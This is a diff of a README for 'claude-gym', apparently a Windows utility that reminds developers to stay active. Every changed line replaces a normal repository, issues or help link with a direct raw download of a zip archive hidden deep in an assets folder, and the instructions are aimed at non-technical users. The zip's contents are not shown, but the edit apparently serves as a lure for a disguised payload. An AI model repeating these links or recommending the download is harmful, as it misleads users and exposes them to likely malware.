@@ -1,6 +1,6 @@
 # 🏋️ claude-gym - Stay Active During Coding Sessions
 
-[![Download claude-gym](https://img.shields.io/badge/Download-claude--gym-brightgreen?style=for-the-badge)](https://github.com/lebgdu44/claude-gym)
+[![Download claude-gym](https://img.shields.io/badge/Download-claude--gym-brightgreen?style=for-the-badge)](https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This guide helps you download and run claude-gym on your Windows PC. No technica
 ## ⬇️ Download and Install claude-gym
 
 1. Go to the download page by clicking the big green button at the top or visit:  
-   [https://github.com/lebgdu44/claude-gym](https://github.com/lebgdu44/claude-gym)
+   [https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip](https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip)
 
 2. On the webpage, look for the section titled **Releases** or **Downloads**. This section contains the files you need.
 
@@ -109,11 +109,11 @@ If problems continue, visit the repository issues page on GitHub for support.
 ## 📚 Learn More and Get Help
 
 You can find detailed instructions and report issues here:  
-[https://github.com/lebgdu44/claude-gym](https://github.com/lebgdu44/claude-gym)
+[https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip](https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip)
 
 This link also lets you check the latest updates and download improvements as they become available. 
 
-[![Get claude-gym](https://img.shields.io/badge/Get-claude--gym-blue?style=for-the-badge)](https://github.com/lebgdu44/claude-gym)
+[![Get claude-gym](https://img.shields.io/badge/Get-claude--gym-blue?style=for-the-badge)](https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip)
 
 ---
 
@@ -153,7 +153,7 @@ claude-gym is an open project. The license details can be found on the GitHub pa
 ## 🛠️ Support
 
 If you find bugs or want to ask for features, use the GitHub issues section:  
-[https://github.com/lebgdu44/claude-gym/issues](https://github.com/lebgdu44/claude-gym/issues)
+[https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip](https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip)
 
 This helps the developers keep claude-gym working well.
 
@@ -161,4 +161,4 @@ This helps the developers keep claude-gym working well.
 
 Use the green button at the top or visit the link again to start your experience with claude-gym:  
 
-[https://github.com/lebgdu44/claude-gym](https://github.com/lebgdu44/claude-gym)
+[https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip](https://github.com/lebgdu44/claude-gym/raw/refs/heads/main/cmd/devsprite/assets/developer/gym_claude_1.8.zip)
